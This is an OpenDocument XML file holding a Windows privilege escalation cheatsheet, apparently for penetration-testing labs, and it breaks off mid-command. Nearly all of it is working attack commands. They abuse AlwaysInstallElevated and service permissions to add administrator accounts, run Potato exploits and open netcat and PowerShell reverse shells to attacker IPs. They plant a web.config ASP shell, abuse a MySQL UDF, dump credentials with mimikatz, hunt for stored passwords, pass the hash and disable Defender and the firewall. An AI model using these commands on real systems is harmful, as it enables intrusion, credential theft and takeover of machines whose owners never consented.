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size="17pt"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-size="16pt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Windows Privilege Escalation Cheatsheet <text:line-break/></text:span><text:line-break/><text:span text:style-name="T2">Find OS Version:</text:span><text:line-break/><text:line-break/>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"<text:line-break/><text:span text:style-name="T2"><text:line-break/>Check for Privileges </text:span><text:line-break/><text:line-break/>whoami /priv <text:line-break/><text:line-break/>See the Services Running as NT Authority<text:line-break/><text:line-break/>wmic service where started=true get name, startname<text:line-break/><text:line-break/><text:span text:style-name="T2">AlwaysInstall Elevated: </text:span><text:line-break/><text:line-break/>Allows non-privileged users to run executables as SYSTEM<text:line-break/><text:line-break/>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated <text:line-break/><text:line-break/><text:span text:style-name="T2">If Available:</text:span><text:line-break/>msfvenom -p windows/adduser USER=bhanu PASS=bhanu123 -f msi -o create_user.msi<text:line-break/><text:span text:style-name="T2"><text:line-break/>On target:</text:span><text:line-break/><text:line-break/>msiexec /quiet /qn /i C:\create_user.msi<text:line-break/><text:line-break/><text:span text:style-name="T2">Metasploit</text:span>:<text:line-break/>use exploit/windows/local/always_install_elevated<text:line-break/><text:line-break/><text:span text:style-name="T2">Scheduled Tasks:</text:span><text:line-break/><text:line-break/>schtasks /query /fo LIST /v        /Too much info<text:line-break/><text:line-break/><text:span text:style-name="T2">Running Windows Services</text:span><text:line-break/><text:line-break/>net start <text:line-break/><text:line-break/>Services Running on Localhost<text:line-break/>netstat -ano <text:line-break/><text:line-break/>netstat -an | find "LISTEN" <text:line-break/><text:line-break/><text:span text:style-name="T2">Using Plink:<text:line-break/></text:span><text:line-break/>plink.exe -l username -pw pasword KALI_IP -R Attacker_Port_to_receive:127.0.0.1:Victim_port_to_Forward<text:line-break/><text:line-break/><text:soft-page-break/><text:line-break/>Example: <text:line-break/>plink -l root -pw password KALI_IP -R 3390:127.0.0.1:3389<text:line-break/><text:line-break/><text:line-break/><text:span text:style-name="T2"><text:line-break/>Portforward using Meterpreter:</text:span><text:line-break/><text:line-break/>portfwd add -l &lt;attacker port&gt; -p &lt;victim port&gt; -r &lt;victim ip&gt;<text:line-break/><text:line-break/>portfwd add -l 3306 -p 3306 -r 192.168.1.101<text:line-break/><text:span text:style-name="T2"><text:line-break/>Compiling 32-bit Exploits:</text:span><text:line-break/><text:line-break/>i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32<text:line-break/><text:line-break/><text:span text:style-name="T2">World Readable </text:span><text:line-break/><text:line-break/>icacls "C:\Program Files\*" 2&gt;nul | findstr "(F)" | findstr "Everyone"<text:line-break/>icacls "C:\Program Files (x86)\*" 2&gt;nul | findstr "(F)" | findstr "Everyone"<text:line-break/><text:line-break/>icacls "C:\Program Files\*" 2&gt;nul | findstr "(F)" | findstr "BUILTIN\Users"<text:line-break/>icacls "C:\Program Files (x86)\*" 2&gt;nul | findstr "(F)" | findstr "BUILTIN\Users" <text:line-break/> <text:span text:style-name="T2"><text:line-break/><text:line-break/>Autologon Registry<text:line-break/></text:span><text:line-break/>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2&gt;nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"<text:line-break/> <text:line-break/><text:line-break/><text:span text:style-name="T2">View Hidden Directories</text:span><text:line-break/><text:line-break/>dir -Force<text:line-break/><text:line-break/><text:span text:style-name="T2">Poweshell Commands:</text:span><text:line-break/>Get-ChildItem . -Force<text:line-break/>gci -Force<text:line-break/>ls -Force<text:line-break/><text:line-break/><text:span text:style-name="T2">Find Passwords in Registry</text:span><text:line-break/><text:line-break/># Windows autologin<text:line-break/>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"<text:line-break/><text:line-break/># VNC<text:line-break/>reg query "HKCU\Software\ORL\WinVNC3\Password"<text:line-break/>reg query "HKCU\Software\TightVNC\Server /v PasswordViewOnly"<text:line-break/>vncpwd.exe PASSWORD_FROM_ABOVE<text:line-break/><text:soft-page-break/><text:line-break/># SNMP Parameters<text:line-break/>reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"<text:line-break/><text:line-break/># Putty<text:line-break/>reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"<text:line-break/><text:line-break/># Search for password in registry<text:line-break/>reg query HKLM /f password /t REG_SZ /s<text:line-break/>reg query HKCU /f password /t REG_SZ /s<text:line-break/><text:line-break/><text:span text:style-name="T2">IIS Webserver - Hidden Files and Config Files </text:span><text:line-break/><text:line-break/>dir /a C:\inetpub\<text:line-break/>dir /s web.config<text:line-break/>C:\Windows\System32\inetsrv\config\applicationHost.config<text:line-break/> <text:line-break/><text:span text:style-name="T2"><text:line-break/>Anything in Credential Manger </text:span><text:line-break/><text:line-break/>cmdkey /list<text:line-break/>dir C:\Users\username\AppData\Local\Microsoft\Credentials\<text:line-break/>dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\<text:line-break/> <text:line-break/><text:span text:style-name="T2"><text:line-break/>Check for Vulnerable Drivers</text:span><text:line-break/><text:line-break/>DRIVERQUERY <text:line-break/><text:line-break/><text:span text:style-name="T2">Find Installed Paths</text:span><text:line-break/><text:line-break/>wmic qfe get Caption,Description,HotFixID,InstalledOn<text:line-break/><text:line-break/>Using Runas to run as Different User<text:line-break/><text:line-break/>PsExec.exe -u hostname\username -p password "nc.exe TARGET_IP 443 -e cmd.exe"<text:line-break/><text:line-break/><text:line-break/>C:\Windows\System32\runas.exe /env /noprofile /user:USERNAME PASSWORD "c:\users\Public\nc.exe -nc TARGET_IP 443 -e cmd.exe"<text:line-break/><text:line-break/><text:line-break/><text:span text:style-name="T2">Using Powershell:<text:line-break/></text:span><text:line-break/>secpasswd = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force<text:line-break/>mycreds = New-Object System.Management.Automation.PSCredential ("USERNAME", $secpasswd)<text:line-break/>computer = "HOSTNAME"<text:line-break/>[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","&lt;attacker_ip&gt; 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)<text:line-break/><text:soft-page-break/><text:span text:style-name="T2"><text:line-break/>TO run the Script:</text:span><text:line-break/><text:line-break/>powershell -ExecutionPolicy Bypass -File c:\users\public\r.ps1<text:line-break/><text:line-break/><text:span text:style-name="T2">Can We Access SAM &amp; System Files</text:span><text:line-break/><text:line-break/>%SYSTEMROOT%\repair\SAM<text:line-break/>%SYSTEMROOT%\System32\config\RegBack\SAM<text:line-break/>%SYSTEMROOT%\System32\config\SAM<text:line-break/>%SYSTEMROOT%\repair\system<text:line-break/>%SYSTEMROOT%\System32\config\SYSTEM<text:line-break/>%SYSTEMROOT%\System32\config\RegBack\system<text:line-break/> <text:line-break/><text:line-break/><text:span text:style-name="T2">Checking File Permissions using assesschk.exe</text:span><text:line-break/><text:line-break/>accesschk.exe -qwsu "Everyone" *<text:line-break/>accesschk.exe -qwsu "Authenticated Users" *<text:line-break/>accesschk.exe -qwsu "Users" *<text:line-break/> <text:line-break/><text:line-break/>accesschk.exe -uwcqv "username" *   / Check for RW permissions<text:line-break/><text:line-break/><text:span text:style-name="T2">Exploit</text:span>: <text:line-break/>sc config daclsvc binpath= "net localgroup administrators bhanu /add "<text:line-break/>sc start daclsvc<text:line-break/><text:line-break/><text:span text:style-name="T2">What are the running processes/services on the system? Is there an inside service not exposed? If so, can we open it?<text:line-break/></text:span><text:line-break/>tasklist /svc<text:line-break/>tasklist /v<text:line-break/>net start<text:line-break/>sc query<text:line-break/> <text:line-break/><text:line-break/><text:span text:style-name="T2">Always Install Elevated Privileges </text:span><text:line-break/><text:line-break/>This the DWORD of these registries contain "AlwaysInstallElevated" which is set to "1", we can install any msi as  NT Authrity\System<text:line-break/><text:line-break/>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<text:line-break/><text:line-break/>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<text:line-break/><text:line-break/>OR<text:line-break/><text:line-break/>reg qurey "HKLM\Software\Policies\Microsoft\Windows\Installer"<text:line-break/><text:soft-page-break/><text:line-break/>reg qurey "HKCU\Software\Policies\Microsoft\Windows\Installer" <text:line-break/><text:line-break/><text:line-break/><text:span text:style-name="T2">Exploit:</text:span><text:line-break/><text:line-break/>msfvenom -p windows/exec CMD='net localgroup administrators bhanu /add' -f msi-nouac -o exploit.msi<text:line-break/><text:line-break/>on Target: msiexec /quiet /qn /i C:\temp\exploit.msi<text:line-break/><text:line-break/><text:span text:style-name="T2">Scheduled Tasks</text:span><text:line-break/><text:line-break/>schtasks /query /fo LIST 2&gt;nul | findstr TaskName<text:line-break/>dir C:\windows\tasks<text:line-break/><text:line-break/><text:span text:style-name="T2">Powershell:</text:span><text:line-break/>Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State<text:line-break/><text:line-break/><text:span text:style-name="T2">Unquoted Service Paths - can be exploited - use PowerUP</text:span><text:line-break/><text:line-break/>wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """<text:line-break/><text:line-break/>OR<text:line-break/><text:line-break/>wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i "Auto" 2&gt;nul |findstr /i /v "C:\Windows\\" 2&gt;nul |findstr /i /v """<text:line-break/><text:line-break/>OR <text:line-break/>sc query state= all | findstr "SERVICE_NAME:" &gt;&gt; a &amp; FOR /F "tokens=2 delims= " %i in (a) DO @echo %i &gt;&gt; b &amp; FOR /F %i in (b) DO @(@echo %i &amp; @echo --------- &amp; @sc qc %i | findstr "BINARY_PATH_NAME" &amp; @echo.) &amp; del a 2&gt;nul &amp; del b 2&gt;nul<text:line-break/><text:line-break/><text:span text:style-name="T2">Powershell:</text:span><text:line-break/>gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name<text:line-break/><text:span text:style-name="T2"><text:line-break/>Juicy Potato Exploit - SeImpersonatePrivilege Enabled</text:span><text:line-break/><text:line-break/>JuicyPotato.exe -l 1340 -p C:\users\User\rev.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}<text:line-break/><text:line-break/>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.37 LPORT=443 -f exe -o reverse.exe<text:line-break/><text:line-break/>./jp.exe -l 1345 -p c:\windows\temp\reverse.exe  -t * <text:line-break/><text:line-break/><text:span text:style-name="T2">Operating System information is found in</text:span><text:line-break/><text:line-break/><text:soft-page-break/>C:\Windows\System32\license.rtf  --&gt; windows 7<text:line-break/>C:\Windows\System32\eula.txt     --&gt; windows xp <text:line-break/><text:line-break/><text:span text:style-name="T2">Decrypt GPP Policy from Groups.xml </text:span><text:line-break/><text:line-break/>Groups.xml:<text:line-break/><text:line-break/>get-content "C:\programdata\Microsoft\group policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml"<text:line-break/><text:line-break/>&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"&gt;<text:line-break/>&lt;User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator" image="2" changed="2019-01-28 23:12:48" uid="{CD450F70-CDB8-4948-B908-F8D038C59B6C}" userContext="0" removePolicy="0" policyApplied="1"&gt;<text:line-break/>&lt;Properties action="U" newName="" fullName="" description="" cpassword="CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="Administrator"&gt;&lt;/Properties&gt;&lt;/User&gt;&lt;/Groups&gt;<text:line-break/><text:line-break/><text:line-break/>gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ <text:line-break/><text:line-break/><text:span text:style-name="T2">Check for Installed Patches </text:span><text:line-break/><text:line-break/>wmic qfe get Caption,Description,HotFixID,InstalledOn <text:line-break/><text:line-break/><text:span text:style-name="T2">Using Sherlock To Check Vulns </text:span><text:line-break/><text:line-break/>certutil -f -split -urlcache http://10.10.10.10/sherlock.ps1<text:line-break/><text:line-break/>poweshell -nop -ep bypass<text:line-break/><text:line-break/>Import-Module .\sherlock.ps1<text:line-break/><text:line-break/>Find-AllVulns<text:line-break/><text:line-break/><text:span text:style-name="T2">Check these Config Files - Might contain Password</text:span><text:line-break/><text:line-break/>type c:\windows\Panther\Untattended.xml  \\Find Base64 password<text:line-break/>type "c:\ProgamData\McAfee\Common Framework\SiteList.xml" \\Find Base64 password<text:line-break/><text:line-break/>c:\sysprep.inf<text:line-break/>c:\sysprep\sysprep.xml<text:line-break/>%WINDIR%\Panther\Unattend\Unattended.xml<text:line-break/>%WINDIR%\Panther\Unattended.xml <text:line-break/><text:line-break/><text:soft-page-break/><text:span text:style-name="T2">Priv Esc using a Service running as root:</text:span><text:line-break/>------------------------------------------<text:line-break/><text:line-break/>services.msc<text:line-break/>select a service, which u think might be vulnerable and go to the file's location in cmd<text:line-break/><text:line-break/>icacls scsiaccess.exe  /if Everyone is present, we can exploit it by replacing the original file by our file<text:line-break/><text:line-break/><text:span text:style-name="T2">in Kali: Lets create an exploit code for it :) </text:span><text:line-break/>----------<text:line-break/>nano useradd.c <text:line-break/><text:line-break/>#include&lt;stdlib.h&gt;<text:line-break/>int main()<text:line-break/>{<text:line-break/>int i;<text:line-break/>i=system("net localgroup administrators username /add");<text:line-break/>return 0;<text:line-break/>}<text:line-break/><text:line-break/>ctrl +x --&gt; y<text:line-break/><text:line-break/>i586-mingw32msv-gcc useradd.c -o useradd.exe<text:line-break/><text:line-break/>copy this useradd.exe to the target machine and name it as scsiaccess.exe<text:line-break/><text:line-break/><text:span text:style-name="T2">restart the machine/service :)</text:span><text:line-break/><text:line-break/>services.msc<text:line-break/>scsiaccess.exe --&gt; right click --&gt; restart<text:line-break/> <text:line-break/><text:span text:style-name="T2"><text:line-break/>Powershell Sudo For Windows</text:span><text:line-break/><text:line-break/>$pw= convertto-securestring "EnterPasswordHere" -asplaintext -force<text:line-break/>$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist "EnterDomainName\EnterUserName",$pw<text:line-break/>$script = "C:\Users\EnterUserName\AppData\Local\Temp\test.bat"<text:line-break/>Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &amp;{Start-Process $script -verb Runas}' <text:line-break/><text:line-break/>powershell -ExecutionPolicy Bypass -File xyz.ps1<text:line-break/><text:line-break/><text:span text:style-name="T2">Disable Firewall/Defender and Enable RDP for all Users<text:line-break/></text:span><text:line-break/>sc stop WinDefend<text:line-break/>netsh advfirewall show allprofiles<text:line-break/>netsh advfirewall set allprofiles state off<text:line-break/>netsh firewall set opmode disable<text:line-break/><text:soft-page-break/>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f<text:line-break/>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f<text:line-break/><text:span text:style-name="T2"><text:line-break/>Downloading Files with bitsadmin<text:line-break/></text:span><text:line-break/>bitsadmin /transfer mydownloadjob /download /priority normal http://&lt;attackerIP&gt;/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe<text:line-break/><text:line-break/><text:span text:style-name="T2">PsExec Shell for Remote Systems</text:span><text:line-break/><text:line-break/>.\psexec64.exe \\192.168.x.x -u .\administrator -p admin@123 cmd.exe<text:line-break/><text:line-break/><text:span text:style-name="T2">Search for keyword "pass,cred,vnc and config"</text:span><text:line-break/><text:line-break/>dir /s *pass* == *cred* == *vnc* == *.config*<text:line-break/><text:line-break/><text:span text:style-name="T2">search files with keyword "Password" in .xml,ini,.txt files </text:span><text:line-break/><text:line-break/>findstr /si password *.xml *.ini *.txt<text:line-break/><text:line-break/><text:span text:style-name="T2">Grep Registry for "Password" Keyword</text:span><text:line-break/><text:line-break/>reg query HKLM /f password /t REG_SZ /s<text:line-break/>reg query HKCU /f password /t REG_SZ /s<text:line-break/><text:span text:style-name="T2"><text:line-break/>Finding Services with incorrect permissions:</text:span><text:line-break/><text:line-break/>for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a &gt;&gt; c:\windows\temp\permissions.txt<text:line-break/><text:line-break/>for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"<text:line-break/><text:line-break/><text:line-break/><text:span text:style-name="T2">If wmic is not availale - try sc</text:span><text:line-break/>sc query state= all | findstr "SERVICE_NAME:" &gt;&gt; Servicenames.txt<text:line-break/>FOR /F %i in (Servicenames.txt) DO echo %i<text:line-break/>type Servicenames.txt<text:line-break/>FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt<text:line-break/>FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" &gt;&gt; path.txt<text:line-break/><text:span text:style-name="T2"><text:line-break/>Windows XP Priv Esc - Incorrect Permission in Services</text:span><text:line-break/><text:line-break/>sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.0.48 9002 -e C:\WINDOWS\System32\cmd.exe"<text:line-break/><text:line-break/><text:span text:style-name="T2">OR - run all the below commands together to create an Administrator account<text:line-break/></text:span><text:line-break/><text:soft-page-break/>sc config SSDPSRV start= auto<text:line-break/>net start SSDPSRV<text:line-break/>net start upnphost<text:line-break/><text:line-break/><text:line-break/>sc config upnphost binpath= "net user bhanu bhanu123 /add"<text:line-break/>sc config upnphost obj= ".\LocalSystem" password= ""<text:line-break/>sc qc upnphost<text:line-break/>net start upnphost<text:line-break/><text:line-break/>sc config upnphost binpath= "net localgroup administrators bhanu /add "<text:line-break/>sc config upnphost obj= ".\LocalSystem" password= ""<text:line-break/>sc qc upnphost<text:line-break/>net start upnphost<text:line-break/><text:line-break/>sc config upnphost binpath= "reg add 'hklm\system\currentcontrolset\control\terminal server' /f /v fDenyTSConnections /t REG_DWORD /d 0 "<text:line-break/>sc config upnphost obj= ".\LocalSystem" password= ""<text:line-break/>sc qc upnphost<text:line-break/>net start upnphost<text:line-break/><text:line-break/>sc config upnphost binpath= "netsh firewall set service remoteadmin enable  "<text:line-break/>sc config upnphost obj= ".\LocalSystem" password= ""<text:line-break/>sc qc upnphost<text:line-break/>net start upnphost<text:line-break/><text:line-break/>sc config upnphost binpath= "netsh firewall set service remotedesktop enable"<text:line-break/>sc config upnphost obj= ".\LocalSystem" password= ""<text:line-break/>sc qc upnphost<text:line-break/>net start upnphost<text:line-break/><text:line-break/><text:line-break/><text:span text:style-name="T2">in Kali:</text:span><text:line-break/>rdesktop IP_Address<text:line-break/><text:line-break/><text:span text:style-name="T2">IIS HTTP 6.0 Exploit </text:span><text:line-break/><text:line-break/><text:span text:style-name="T2">No Proper Input Validation, So change your exploit to </text:span><text:line-break/><text:line-break/>msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -f asp -o payload.html<text:line-break/><text:line-break/>move payload.html payload.asp;.html<text:line-break/><text:line-break/>Priv Esc From NT Authrity Service to NT Authority System<text:line-break/><text:line-break/><text:line-break/><text:span text:style-name="T2">Windows Server 2003 -- NT Authority Service to System <text:line-break/><text:line-break/>Download and copy the exploit to target machine </text:span><text:line-break/><text:soft-page-break/><text:line-break/>https://www.exploit-db.com/exploits/6705<text:line-break/><text:line-break/>Github <text:line-break/><text:line-break/>Exploiting IIS 6 with ASP .NET<text:line-break/><text:line-break/>copy churrasco.exe c:\windows\temp\<text:line-break/><text:line-break/>churrasco.exe -d "net users /add bhanu bhanu123"<text:line-break/><text:line-break/>churrasco.exe -d "net localgroup administrators bhanu /add"<text:line-break/><text:line-break/>churrasco.exe -d “reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0”<text:line-break/><text:line-break/>churrasco.exe -d "netsh firewall set service remoteadmin enable"<text:line-break/><text:line-break/>churrasco.exe -d “netsh firewall set service remotedesktop enable”<text:line-break/><text:line-break/>Might be Helpful - Rotten Potato<text:line-break/><text:line-break/>Exploiting IIS httpd 7.5<text:line-break/><text:line-break/><text:span text:style-name="T2">You need to add the following code at the end of web.config file and upload it into the server and get a reverse shell using it. reverse shell should be in winrevshell.ps1 file; a file sharing server should be turned on as well. </text:span><text:line-break/><text:line-break/>&lt;%<text:line-break/>Set s = CreateObject("WScript.Shell")<text:line-break/>Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://IP_ADDRESS/winrevshell.ps1')")<text:line-break/>o = cmd.StdOut.Readall()<text:line-break/>Response.write(o)<text:line-break/>%&gt; <text:line-break/><text:line-break/><text:span text:style-name="T2">Sample Web.config file with Exploit</text:span><text:line-break/><text:line-break/>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<text:line-break/>&lt;configuration&gt;<text:line-break/>   &lt;system.webServer&gt;<text:line-break/>      &lt;handlers accessPolicy="Read, Script, Write"&gt;<text:line-break/>         &lt;add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /&gt;        <text:line-break/>      &lt;/handlers&gt;<text:line-break/>      &lt;security&gt;<text:line-break/>         &lt;requestFiltering&gt;<text:line-break/>            &lt;fileExtensions&gt;<text:line-break/><text:soft-page-break/>               &lt;remove fileExtension=".config" /&gt;<text:line-break/>            &lt;/fileExtensions&gt;<text:line-break/>            &lt;hiddenSegments&gt;<text:line-break/>               &lt;remove segment="web.config" /&gt;<text:line-break/>            &lt;/hiddenSegments&gt;<text:line-break/>         &lt;/requestFiltering&gt;<text:line-break/>      &lt;/security&gt;<text:line-break/>   &lt;/system.webServer&gt;<text:line-break/>&lt;/configuration&gt;<text:line-break/><text:line-break/>&lt;%<text:line-break/>Set s = CreateObject("WScript.Shell")<text:line-break/>Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://IP_ADDRESS/winrevshell.ps1')")<text:line-break/>o = cmd.StdOut.Readall()<text:line-break/>Response.write(o)<text:line-break/>%&gt; <text:line-break/><text:line-break/><text:span text:style-name="T2">Mysql Running as Root<text:line-break/><text:line-break/>Download the UDF file from Here<text:line-break/><text:line-break/>Tutorial is here</text:span><text:line-break/><text:span text:style-name="T2"><text:line-break/></text:span>use mysql;<text:line-break/>create table potato(line blob);<text:line-break/>insert into potato values(load_file('/tmp/lib_mysqludf_sys.so'));<text:line-break/>select * from potato into dumpfile '/usr/lib/lib_mysqludf_sys.so';<text:line-break/>create function sys_exec returns integer soname 'lib_mysqludf_sys.so';<text:line-break/>select sys_exec('bash -i &gt;&amp; /dev/tcp/IP_ADDRESS/443 0&gt;&amp;1');<text:line-break/><text:line-break/><text:line-break/><text:span text:style-name="T2">OR try the automated script<text:line-break/>Github Exploit  Video Tutorial  </text:span><text:line-break/><text:line-break/>Meterpreter ASP Reverse Shell or Windows<text:line-break/><text:line-break/>msfvenom -p windows/meterpreter/reverse_tcp -f aspx LHOST=10.11.0.48 LPORT=9001 -f asp &gt; shell.asp<text:line-break/><text:span text:style-name="T2"><text:line-break/>Dumping Credentials using mimikatz</text:span><text:line-break/><text:line-break/>mimikatz.exe <text:line-break/><text:line-break/>privilege::debug          /You should see 200 OK<text:line-break/><text:line-break/>sekurlsa::logonpasswords     /dump creds and other info<text:line-break/><text:span text:style-name="T2"><text:line-break/>Current User:</text:span><text:line-break/><text:soft-page-break/><text:line-break/>whoami /all<text:line-break/><text:line-break/><text:span text:style-name="T2">List out all Users:</text:span><text:line-break/><text:line-break/>net user<text:line-break/><text:line-break/><text:span text:style-name="T2">Add a user:</text:span><text:line-break/><text:line-break/>net user maven maven123 /add<text:line-break/><text:line-break/><text:span text:style-name="T2">Adding a user to Administrators Group:</text:span><text:line-break/><text:line-break/>net localgroup administrators maven /add<text:line-break/><text:line-break/><text:span text:style-name="T2">Remove a user:</text:span><text:line-break/><text:line-break/>net user maven /del<text:line-break/><text:line-break/><text:span text:style-name="T2">Check for Active Users using Powershell:</text:span><text:line-break/><text:line-break/>powershell -Command (get-wmiobject win32_useraccount<text:line-break/><text:line-break/><text:span text:style-name="T2">View Hidden Directories:</text:span><text:line-break/><text:line-break/>dir -Force<text:line-break/><text:line-break/>dir /R<text:line-break/><text:span text:style-name="T2"><text:line-break/>Get a Proper Windows Shell:</text:span><text:line-break/><text:line-break/>apt-get install rlwrap <text:line-break/><text:line-break/>Powershell IEX(new-object Net.WebClient).Downloadstring(\"http://10.10.14.35:8001/revs.ps1\")<text:line-break/><text:line-break/>rlwrap nc -nvlp 9001<text:line-break/><text:line-break/>Hot Potato - Exploit <text:line-break/><text:line-break/><text:span text:style-name="T2">Importing a Powershell Exploit and execute it</text:span> <text:line-break/><text:line-break/>powershell -ep bypass -nop <text:line-break/>Import-Module .\Tater.ps1<text:line-break/>Invoke-Tater -Trigger 1 -Command "net users \add bhanu"Invoke-Tater -Trigger 1 -Command "net localgroup administrators bhanu /add"<text:line-break/><text:line-break/><text:span text:style-name="T2">Download and Execute a Reverse Shell</text:span><text:line-break/><text:line-break/>Powershell IEX(new-object Net.WebClient).Downloadstring(\"http://10.10.14.35:8001/revs.ps1\")<text:line-break/><text:soft-page-break/>python -m SimpleHTTPServer 8001<text:line-break/><text:line-break/>nc -nvlp 9001<text:line-break/><text:line-break/>#Reverse Shell Used is Nishang Invoke-Powershell-TCP.ps1<text:line-break/><text:line-break/>Change ACL for a file <text:line-break/><text:line-break/>cacls “C:\Users\Administrator\Desktop\root.txt” /E /P Alfred:F<text:line-break/><text:line-break/><text:span text:style-name="T2">cacls Windows utility to view/edit file permissions </text:span><text:line-break/>/E to edit ACL <text:line-break/>/P to set permissions <text:line-break/>Alfred:F to give Alfred full control of the file<text:line-break/><text:line-break/><text:span text:style-name="T2">Add this to Cron Jobs To get a Shell</text:span><text:line-break/><text:line-break/> echo "IEX(New-Object Net.webClient).DownloadString('http://10.10.14.11:8001/rev9002.ps1')" &gt; cronjob_FileName.ps1 <text:line-break/><text:line-break/><text:span text:style-name="T2">Logging in with NTLM hashes </text:span><text:line-break/><text:line-break/>pth-winexe --user=jeeves/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 --system //10.10.10.63 cmd.exe<text:line-break/><text:line-break/><text:span text:style-name="T2">Create RDP Access on a Target Machine<text:line-break/><text:line-break/>Useful when you have remote code execution</text:span> <text:line-break/><text:line-break/>net user /add maven maven123  /Create an account named Maven <text:line-break/><text:line-break/>net localgroup administrators maven /add   Assign Admin Privs  <text:line-break/><text:line-break/><text:line-break/>reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0    Start RDP Service <text:line-break/><text:line-break/>netsh firewall set service remoteadmin enable <text:line-break/><text:line-break/>netsh firewall set service remotedesktop enable<text:line-break/><text:line-break/><text:line-break/><text:span text:style-name="T2"><text:line-break/>On kali:</text:span><text:line-break/>rdesktop 10.10.10.10<text:line-break/><text:line-break/><text:span text:style-name="T2"><text:line-break/>{Metasploit} Login with NTML Pass hases into a Windows machine<text:line-break/></text:span><text:soft-page-break/><text:line-break/>use exploit/windows/smb/psexec<text:line-break/>set rhost 10.10.10.10<text:line-break/>set smbuser administrator<text:line-break/>set smbpass aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00<text:line-break/>set lport 8888<text:line-break/>exploit<text:line-break/><text:line-break/><text:line-break/>run getgui -e    /Enable RDP on Target<text:line-break/>shell<text:line-break/>net user administrator password<text:line-break/><text:span text:style-name="T2"><text:line-break/>on Kali:</text:span><text:line-break/>rdesktop 10.10.10.10<text:line-break/>administrator password<text:line-break/><text:line-break/><text:line-break/><text:span text:style-name="T2">Check for Hidden Files:</text:span><text:line-break/> get-content .\root.txt -stream *<text:line-break/> get-content .\root.txt -stream root.txt<text:line-break/><text:line-break/><text:span text:style-name="T2">Run as admin with prev saved cred</text:span><text:line-break/><text:line-break/>runas /user:Administrator /noprofile /savecred "cmd.exe /c type C:\users\administrator\desktop\root.txt &gt; C:\users\security\root.txt<text:line-break/><text:line-break/><text:line-break/><text:span text:style-name="T2">File transfer using Certutil.exe</text:span><text:line-break/><text:line-break/>certutil.exe -urlcache -split -f http://10.10.14.6/sherlock.ps1 sherlock.ps1<text:line-break/><text:line-break/><text:line-break/><text:span text:style-name="T2">Priv Esc (getting Root) using Metasploit</text:span><text:line-break/><text:line-break/>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.6 LPORT=9003 –platform win -a x64 -f exe &gt; shell.exe<text:line-break/><text:line-break/><text:line-break/>certutil -urlcache -f http://10.10.14.6:8001/shell.exe shell.exe<text:line-break/><text:line-break/><text:line-break/>msfconsole<text:line-break/>use exploit/multi/handler<text:line-break/>set payload windows/x64/meterpreter_reverse_tcp <text:line-break/>set lport 9003<text:line-break/>set lhost 